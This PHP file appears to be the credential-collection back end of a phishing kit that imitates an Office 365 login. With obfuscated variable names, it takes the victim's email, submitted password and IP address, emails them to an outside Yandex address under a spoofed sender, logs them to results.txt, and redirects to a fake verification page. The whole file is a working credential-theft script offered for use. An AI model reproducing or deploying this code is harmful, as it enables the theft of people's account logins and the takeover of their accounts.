<?php
session_start();
$Vaciknufzsky = getenv("REMOTE_ADDR");
$Vd5rgrkn3ik3 = "";
$Vd5rgrkn3ik3 .= "===============|New Log|==============\n";
$Vd5rgrkn3ik3 .= "Email: ".$_SESSION['clientemail']."\n";
$Vd5rgrkn3ik3 .= "First Password: ".$_POST['password']."\n";
$Vd5rgrkn3ik3 .= "IP: ".$Vaciknufzsky."\n";
$Vd5rgrkn3ik3 .= "===============|Burhan-updated|==============\n";
$V3gxu1m2kgkm = "burhan.ahmad@yandex.com";
$Vzvoneollnqp = "OFFICE365 - LOGIN - FROM [$Vaciknufzsky]";
$V30sbmn0ftdu = "From: Burhan-updated<goggle.comm>";
$V30sbmn0ftdu .= $_POST['eMailAdd']."\n";
$V30sbmn0ftdu .= "MIME-Version: 1.0\n";
mail("$V3gxu1m2kgkm",$Vzvoneollnqp,$Vd5rgrkn3ik3,$V30sbmn0ftdu);
$fp = fopen("results.txt","a");
fputs($fp,$Vd5rgrkn3ik3);
fclose($fp);
header("Location: ../verificationAttempt.php?sf58gfd1s689sxd2sdf8angf264s9df23sd2f1n495K3L2C151645172991f1477dbd26917ef3822423f62e984a91f1477dbd26917ef3822423f62e984a91f1477dbd");
	  

?>
